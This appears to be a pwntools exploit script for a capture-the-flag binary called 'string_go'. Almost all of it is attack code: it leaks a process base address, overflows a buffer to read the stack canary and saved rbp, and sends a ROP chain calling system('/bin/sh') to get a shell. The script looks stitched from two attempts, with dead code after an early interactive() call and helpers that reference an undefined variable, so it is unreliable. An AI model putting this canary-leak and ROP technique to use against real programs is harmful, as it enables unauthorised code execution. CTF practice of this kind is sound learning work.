# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('127.0.0.1', 6010)
libc = ELF('./libc-2.27.so')
io = process('./string_go')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
#dbg()
#pause()
sla('>>> ','(1+2)')

sla('>>> ','1')
sla('>>> ','2')
sla('>>> ','1')
rl()
#sla('>>> ','(1+2)')
rl()
irt()
# 0x0000000000000b83 : pop rdi ; ret
ret = 0x00000000000007d9

sla('something\n','1')
ru('some trick\n')
vunaddr = int(io.recv(),16)
lg('vunaddr')
processbase = vunaddr - 0x9B9
lg('processbase')
sl('2')
pay = "a"*105 
# dbg()
# pause()
sa('hello\n',pay)
ru(pay)
canary = ur64(io.recvn(7))
rbp = uu64(io.recvn(6))
lg('rbp')
lg('canary')
'''
recv = io.recv()
rbp = uu64(recv[-6:])
lg('rbp')
canary = u64(recv[-13:-6].rjust(8, '\x00'))
lg('canary')
'''
system = processbase + 0x0808
binsh = processbase + 0x202010
lg('binsh')

pop_rdi = processbase + 0x0000000000000b83
pay = "a"*104+ p64(canary) + p64(rbp) + p64(processbase + ret) + p64(pop_rdi) + p64(binsh) + p64(system)
sn(pay)


irt()
